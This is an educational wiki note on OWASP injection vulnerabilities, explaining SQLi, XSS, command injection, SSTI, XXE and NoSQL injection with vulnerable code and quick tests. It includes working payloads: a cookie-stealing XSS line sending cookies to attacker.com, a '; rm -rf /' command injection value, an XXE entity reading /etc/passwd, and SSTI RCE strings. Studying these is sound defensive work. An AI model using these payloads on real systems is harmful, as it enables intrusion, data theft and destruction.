# A03 — Injection

← [[OWASP-Overview]]

---

Injection happens when untrusted user data is sent to an interpreter as part of a command or query. The interpreter can't tell the difference between intended code and attacker-supplied data — so it executes both.

---

## The Core Idea

Every injection vulnerability shares the same root cause:

**User input is treated as code instead of data.**

The fix is always the same too: **separate code from data** (parameterized queries, output encoding, safe APIs).

---

## Injection Types

| Type | Interpreter | Example |
|------|------------|---------|
| SQL Injection | SQL database | `' OR '1'='1` in a login form |
| XSS | Browser / HTML | `<script>alert(1)</script>` in user content |
| Command Injection | OS shell | `; rm -rf /` in a filename parameter |
| SSTI | Template engine | `{{7*7}}` returning `49` |
| XXE | XML parser | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| LDAP Injection | LDAP directory | `*)(uid=*))(|(uid=*` |
| NoSQL Injection | MongoDB, etc. | `{"$gt": ""}` instead of a password |
| Header Injection | HTTP parser | `\r\n` in a header value |

---

## SQL Injection

The classic. Still exists everywhere, especially in legacy apps and edge-case parameters.

**What happens:** User input is concatenated into a SQL query without sanitization.

```python
# Vulnerable
query = "SELECT * FROM users WHERE username = '" + username + "'"

# Input: ' OR '1'='1' --
# Result: SELECT * FROM users WHERE username = '' OR '1'='1' --'
# All users returned
```

**Impact:**
- Authentication bypass
- Data exfiltration (dump entire database)
- Data modification/deletion
- In some cases, RCE (via `xp_cmdshell` in MSSQL, `INTO OUTFILE` in MySQL)

Deep dive: [[SQLi-Overview]]

---

## Cross-Site Scripting (XSS)

User input is reflected back into HTML without encoding. The browser executes it as JavaScript.

```html
<!-- Vulnerable search page: -->
<p>Results for: <?= $_GET['q'] ?></p>

<!-- Attacker input: <script>document.location='https://attacker.com/steal?c='+document.cookie</script> -->
```

**Three types:**
- **Reflected** — payload in the request, reflected in response (URL-based)
- **Stored** — payload saved to DB, executed when anyone views the content
- **DOM** — payload processed by client-side JS without server involvement

Deep dive: [[XSS-Overview]]

---

## Command Injection

User input is passed to a system shell command.

```python
# Vulnerable
os.system("ping -c 1 " + user_input)

# Input: 127.0.0.1; cat /etc/passwd
# Runs: ping -c 1 127.0.0.1; cat /etc/passwd
```

**Where to look:** File conversion features, ping/traceroute utilities, image processing, DNS lookups, anything that says "processing" in the UI.

**Impact:** Usually RCE — full compromise of the server.

---

## Server-Side Template Injection (SSTI)

User input is inserted into a template that gets rendered server-side.

```
# Input into a "greeting name" field:
{{7*7}}

# If the response shows "49" instead of "{{7*7}}", SSTI is present
```

Each template engine has its own payload for RCE:
- Jinja2 (Python): `{{ ''.__class__.__mro__[1].__subclasses__() }}`
- Twig (PHP): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- Freemarker (Java): `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

Deep dive: [[SSTI]]

---

## XXE — XML External Entity

XML parsers that process external entities can be tricked into reading local files or making server-side requests.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Where to look:** Any feature that accepts XML input — SOAP APIs, file upload (`.docx`, `.xlsx`, `.svg` are XML), RSS/Atom feeds.

Deep dive: [[XXE]]

---

## NoSQL Injection

MongoDB and similar databases use JSON/object queries. You can inject operators if input isn't sanitized.

```javascript
// Vulnerable login:
db.users.find({ username: req.body.username, password: req.body.password })

// Input: {"username": "admin", "password": {"$gt": ""}}
// Matches any document where password > "" (all of them)
// Auth bypass achieved
```

---

## Finding Injection Points

Injection requires user-controlled input reaching an interpreter. Look for input that:
- Gets reflected in the response (XSS territory)
- Causes different behavior when you add quotes, semicolons, or brackets
- Triggers errors that mention SQL, template syntax, or command output
- Is used in "search", "filter", "export", "convert", "process" features

**Quick test for each type:**

| Type | Quick Test |
|------|-----------|
| SQLi | `'` → SQL error? `' OR '1'='1'--` → auth bypass? |
| XSS | `<script>alert(1)</script>` or `"><img src=x onerror=alert(1)>` |
| Command | `; sleep 5` → does the response take 5 seconds longer? |
| SSTI | `{{7*7}}` or `${7*7}` → does the app return `49`? |
| XXE | Submit an XML doc with an external entity |

---

*Related: [[SQLi-Overview]] | [[XSS-Overview]] | [[SSTI]] | [[XXE]] | [[OWASP-Overview]]*

*Sources: OWASP Top 10 2021, OWASP Testing Guide v4, PortSwigger Web Security Academy*
